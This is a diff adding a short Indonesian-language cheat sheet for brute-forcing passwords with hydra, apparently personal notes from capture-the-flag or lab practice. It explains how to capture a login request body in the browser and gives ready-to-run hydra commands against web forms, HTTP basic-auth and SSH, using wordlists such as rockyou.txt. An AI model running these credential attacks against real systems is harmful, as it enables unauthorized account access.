@@ -1,0 +1,27 @@
+# web login
+inspect element pergi ke tab `network`, lalu coba untuk
+login dengan user:passw sembarang, lalu pada bagian tab
+`network` tersebut kita pilih POST method, dan klik
+`Resend` pada bagian kanan untuk melihat isi body dari
+request. kemudian copas lalu masukkan ke hydra
+
+```
+hydra -l username -P password.txt IP-target http-form-post "/page:body_req_username=^USER^&password=^PASS^:Incorrect Message"
+```
+
+contoh:
+```
+hydra -l santa  -P passwords.txt  -u 10.10.183.157 http-post-form "/index.php:username=^USER^&password=^PASS^&submit=Login:Invalid username and password" -v
+```
+
+## web login yang popup
+```
+hydra -l bob -P password.txt IP http-get -f /protected/`
+```
+
+# ssh
+lebih simple
+```
+hydra -l username -P /usr/share/wordlists/rockyou.txt IP-target -s PORT-target ssh
+```
+
